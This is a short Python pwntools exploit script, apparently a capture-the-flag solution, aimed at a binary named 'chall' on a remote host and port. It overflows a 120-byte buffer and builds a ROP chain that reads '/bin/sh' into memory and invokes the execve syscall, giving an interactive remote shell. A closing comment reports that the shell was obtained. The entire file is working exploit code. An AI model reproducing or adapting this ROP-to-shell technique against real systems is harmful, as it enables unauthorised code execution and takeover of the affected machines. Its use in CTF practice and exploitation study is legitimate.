from pwn import *
# import time
elf = context.binary = ELF("./chall")
# r = process()
r = remote("116.254.117.234",5322)
rop = ROP(context.binary)
wa_memory = 0x4bd090
offset = 120
pop_rdx_rbp = 0x0000000000479f57
# syscall_ret =
rop.raw(b"A" * offset)
rop.rax = constants.SYS_read
rop.rdi = 0
rop.rsi = wa_memory
rop.rdx = 0xff
rop.raw(rop.find_gadget(['syscall','ret'])[0])
rop.raw(rop.find_gadget(['pop rax','ret'])[0])
rop.raw(59)
rop.raw(rop.find_gadget(['pop rdi','ret'])[0])
rop.raw(p64(wa_memory))
rop.raw(rop.find_gadget(['pop rsi','ret'])[0])
rop.raw(0)
rop.raw(p64(pop_rdx_rbp))
rop.raw(0)
rop.raw(0)
rop.raw(rop.find_gadget(['syscall','ret'])[0])
# time.sleep(20)
# print("GO")
r.sendline(b"junk")
r.sendline(rop.chain())
r.send(b"/bin/sh\x00")
print(rop.dump())
r.interactive()
write("payload",rop.chain())

# FLAG: IDK IN THEIR MACHINE IS GONE ? BUT I GOT THE SHELL